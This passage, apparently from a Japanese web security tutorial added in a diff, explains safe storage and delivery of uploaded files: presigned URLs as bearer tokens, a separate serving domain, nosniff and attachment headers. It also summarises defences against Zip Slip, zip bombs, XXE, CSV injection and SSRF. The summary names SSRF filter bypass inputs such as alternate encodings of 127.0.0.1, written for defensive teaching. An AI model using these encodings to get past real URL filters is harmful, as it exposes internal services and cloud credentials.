+- 画素数の上限を設ける（前の節の Pillow の `MAX_IMAGE_PIXELS`）
+- 変換は**権限を絞った別のプロセスやコンテナ**で動かす。第 160 回の `--cap-drop ALL`、`--read-only`、seccomp、そしてネットワークを持たせないことがそのまま使える
+- 依存しているライブラリの更新を追う（第 175 回の SCA）
+
+## 保存場所と配信
+
+最後に、受け取ったファイルを**どこに置き、どこから配るか**です。
+
+### 置く場所
+
+OWASP のチートシートは、**別のホストに置く**か、それができなければ**ドキュメントルートの外に置く**よう勧めています（[OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)）。アプリケーションのサーバのドキュメントルートに置くと、`.php` のような実行されるファイルを上げられたときに、そのままサーバの上で動いてしまいます。
+
+多くの場合、置き場所はオブジェクトストレージになります。そのときは、**オブジェクトのキーをアプリケーションが生成し**（Zip Slip の節と同じ理由です）、第 179 回で見たとおり**キーの接頭辞にテナントを入れ、アプリケーションの側でも、ストレージの権限でもテナントをまたげないようにします**。
+
+### 配る経路
+
+配り方は大きく 2 つあります。
+
+| 方式 | 流れ | 注意 |
+| --- | --- | --- |
+| アプリケーションを通す | アプリケーションが権限を確かめ、ストレージから読んで返す | 大きなファイルでアプリケーションのサーバが詰まる |
+| 署名付き URL | アプリケーションが権限を確かめ、期限付きの URL を発行する。ブラウザはストレージから直接取る | URL を持つ人は誰でも使える |
+
+S3 の**署名付き URL** は、URL を発行した主体の権限で、期限が切れるまで何度でも使えます。AWS のドキュメントは、署名付き URL を**持っている人にアクセスを与えるベアラートークン**だと説明しています。期限は CLI や SDK で最大 7 日ですが、一時的な認証情報で作った URL は、その認証情報が切れた時点で使えなくなります（[AWS: Using presigned URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html)）。
+
+ベアラートークンなので、第 119 回の JWT と同じ注意が要ります。**期限は短く**し、ログや `Referer` に URL が残ることを前提にし、アップロード用の URL では**キーと大きさと種類を発行時に固定**します。同じキーにすでにオブジェクトがあれば上書きされるので、キーを利用者に選ばせてはいけません。
+
+### 配るオリジン
+
+利用者が上げたファイルは、**アプリケーションとは別のサイト**から配ります。第 101 回で見たサンドボックス用のドメインです。同じサイトのサブドメイン（`files.example.com`）では、Cookie の範囲（第 118 回）や SameSite の判定で、アプリケーションと同じ側に入ってしまいます。別の登録可能ドメイン（`example-usercontent.com` のような）にすれば、そこで HTML やスクリプトが動いても、アプリケーションの Cookie やオリジンには届きません。
+
+```
+アプリケーション         app.example.com          ← セッションの Cookie はここ
+利用者のファイル         xxx.example-usercontent.com  ← 別のサイト。nosniff と attachment を付ける
+                         （ストレージの署名付き URL）
+```
+
+## 全体を並べる
+
+この回で見た問題を、「相手が決めたものを、こちらが何として解釈したか」で並べ直します。
+
+| 攻撃 | 相手が決めたもの | こちらの解釈 | 止める場所 |
+| --- | --- | --- | --- |
+| Zip Slip | アーカイブの中の名前 | ファイルシステムのパス | 正規化してから展開先の中かを確かめる。名前を生成する |
+| zip bomb | 圧縮されたデータ | 展開してよい量 | 展開しながら数える上限 |
+| XXE | XML の DTD | 読み込み命令 | DTD を拒否する |
+| CSV インジェクション | セルの文字列 | 数式 | 先頭の文字のエスケープ。xlsx で型を指定 |
+| SSRF | URL | 接続先 | 解決した IP アドレスを検査し、そこにだけつなぐ。リダイレクトをたどらない |
+| sniffing | ファイルの中身 | HTML やスクリプト | `Content-Type` を決め、nosniff。別のサイトから配る |
+| 画像ライブラリ | 画像の中身 | 形式と処理の手順 | 形式を絞る。再エンコード。隔離して動かす |
+
+どの行も、**確かめるのは「入ってきた文字列」ではなく「最後に使われる形」**です。パスなら正規化した後、IP アドレスなら OS が解決した後、展開した量なら展開している最中。文字列の段階での検査は、解釈の違いで必ずどこかが抜けます。
+
+この章の流れで言えば、これらは第 175 回の SAST が「source から sink への流れ」として見つけ、第 176 回の DAST が外から試し、第 179 回のテナントの検査と同じように、**回帰しないようテストに書いておく**ものです。上の実験の素朴な実装と安全な実装の対は、そのまま単体テストの形になっています。
+
+次の第 181 回は、この章の最後の回です。ここまでで、守りを作り、検査し、配るまでを見てきました。最後に、**それが確かに効いていたことを、後から第三者に示せる形で残す**ことを扱います。監査ログ、改ざんの検知、SIEM、継続的な統制の監視、そして SOC 2 です。
+
+## まとめ
+
+- アップロード、エクスポート、URL からの取り込みは、どれも**相手が決めたデータを、こちらがデータ以上のものとして解釈する**ことで問題になる
+- Zip Slip は、アーカイブの中の名前を展開先とつないで外に書く問題。`realpath` で正規化し、`commonpath` で展開先の中かを確かめる。Python 3.14 の `zipfile` は `..` を取り除き、`tarfile` は既定で `data` フィルタを使うが、版と言語で違う
+- 100 MiB のゼロは約 100 KB に縮んだ（約 1,029 倍）。ヘッダの大きさは作った人が書く値なので、**展開しながら数える上限**で止める
+- xlsx や docx は XML の zip。XXE は DTD を拒否して防ぐ。手元の Python の標準ライブラリは既定で外部実体を読まなかったが、信頼できない XML には `defusedxml` が勧められている
+- CSV インジェクションは、開く側が `=` などで始まるセルを数式として評価する問題。先頭に `'` を付けるが、負の数や機械での読み直しに副作用があり、完全ではない
+- SSRF の検査は、`2130706433`、`0x7f.1`、`[::ffff:127.0.0.1]`、リダイレクト、DNS rebinding で抜けた。**1 回だけ名前を引き、解決した IP アドレスを検査し、その IP アドレスにつなぎ、リダイレクトをたどらない**と止まった
+- 同じ `0177.0.0.1` を、`inet_aton` は 127.0.0.1、手元の `getaddrinfo` は 177.0.0.1 と解釈した。検査と接続で解釈が違えば検査は意味がない
+- IMDSv2 はトークンの `PUT`、`X-Forwarded-For` の拒否、hop limit でメタデータの側から SSRF を難しくするが、アプリケーションの側の対策の代わりにはならない
+- 返すときは `Content-Type` をサーバが決め、`nosniff` と `attachment` を付け、**別のサイト**から配る。署名付き URL はベアラートークンとして扱う
+- 画像処理は形式を絞り、再エンコードし、隔離したプロセスで動かす
